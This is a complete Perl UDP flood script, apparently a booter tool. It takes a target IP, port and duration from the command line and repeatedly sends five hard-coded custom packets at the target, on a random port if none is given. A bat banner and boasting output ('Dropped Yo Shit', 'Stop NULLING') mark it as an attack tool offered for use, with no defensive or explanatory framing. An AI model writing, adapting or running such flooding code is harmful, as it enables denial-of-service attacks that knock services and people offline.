#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
	
use Socket;
use strict;

my ($ip,$port,$time) = @ARGV;

my ($iaddr,$endtime,$pport);
my @packets = (
    "000100460000d2be00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000083a2",
    "000100460000d2be00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000078e4",
    "1337cafe01000000",
    "90f8d13dd74812950000d2bee64376022c70d23ec79f529944839ce257b450442fd36e0d21fd87f10a956c",
    "9078d13ed74818350000d2bebede0002fd474dfc9ae8cd3aa87dfc61a30f63735c66c7c940c721c84120c400000080",
);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;

MMMMMMMMMMMMMMMMMMMMM                              MMMMMMMMMMMMMMMMMMMMM
 `MMMMMMMMMMMMMMMMMMMM           N    N           MMMMMMMMMMMMMMMMMMMM'
   `MMMMMMMMMMMMMMMMMMM          MMMMMM          MMMMMMMMMMMMMMMMMMM'  
     MMMMMMMMMMMMMMMMMMM-_______MMMMMMMM_______-MMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
     .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.    
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
                   `MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'                
                          `MMMMMMMMMMMMMMMMMM'                    
                              `MMMMMMMMMM'                              
                                 MMMMMM                         
                                  MMMM                                  
                                   MM                                  


EOTEXT

print "MemeCFW and The Bat Dropped Yo Shit $ip " . ($port ? $port : "Random") . " Port With Custom Packets" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Stop NULLING With Ctrl-C\n" unless $time;

my @binary_packets = map { pack("H*", $_) } @packets;

for (;time() <= $endtime;) {
  $pport = $port ? $port : int(rand(65500))+1;
  
  foreach my $packet (@binary_packets) {
    send(flood, $packet, 0, pack_sockaddr_in($pport, $iaddr));
  }

}
